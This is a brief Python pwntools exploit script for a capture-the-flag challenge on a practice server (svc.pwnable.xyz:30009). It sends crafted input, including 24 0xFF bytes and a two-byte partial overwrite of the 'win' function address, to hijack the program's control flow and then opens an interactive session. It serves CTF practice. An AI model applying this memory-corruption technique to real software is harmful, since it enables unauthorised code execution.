from pwn import *
import math

e = ELF('./challenge')
p  = process(e.path)
p = remote('svc.pwnable.xyz',30009)

def fill_saves():
    for i in range(5):
        p.recvuntil(b'> ')
        p.sendline(b'2')

def play():
    correct = p.recvuntil(b'> ')
    print(correct)
    if b'Invalid' in correct:
        print('errore')
        print(correct)

    p.sendline(b'1')
    problem = p.recvuntil(b'=')
    problem = problem.split(b' ')
    number_1 = int(problem[0])
    number_2 = int(problem[2])
    operation = problem[1]
    result = -1


    p.sendline(str(result).encode())


p.recvuntil(b'Name: ')
p.send(b'A'*16)

play()

fill_saves()

p.recvuntil(b'> ')
p.sendline(b'3')

p.send(b'\xFF'*24+p64(e.symbols['win'])[:2])


p.interactive()
